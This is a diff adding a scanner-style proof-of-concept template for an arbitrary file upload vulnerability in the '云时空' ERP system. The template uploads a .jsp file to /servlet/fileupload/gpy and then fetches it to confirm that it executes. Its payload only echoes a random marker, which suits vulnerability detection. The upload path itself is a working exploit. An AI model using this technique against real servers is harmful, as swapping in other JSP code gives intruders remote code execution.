@@ -1,0 +1,52 @@
+id: poc-yaml-yun-shi-kong-erp-system-gpy-anyfile-upload
+info:
+  name: 云时空社会化商业ERP系统 gpy 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/servlet/fileupload/gpy"
+    headers:
+      Content-Type: "multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388"
+    body: |-
+      --4eea98d02AEa93f60ea08dE3C18A1388
+      Content-Disposition: form-data; name="file1"; filename="{{t1}}.jsp"
+      Content-Type: application/octet-stream
+
+      <% out.println("{{t2}}"); %>
+      --4eea98d02AEa93f60ea08dE3C18A1388--
+    matchers:
+      - type: regex
+        regex:
+          - "(?P<t3>(\\d{4}-\\d{2}-\\d{2}))"
+    extractors:
+      - type: regex
+        name: t3
+        group: 1
+        internal: true
+        regex:
+          - "(?P<t3>(\\d{4}-\\d{2}-\\d{2}))"
+
+  - id: validate-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/uploads/pics/{{t3}}/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
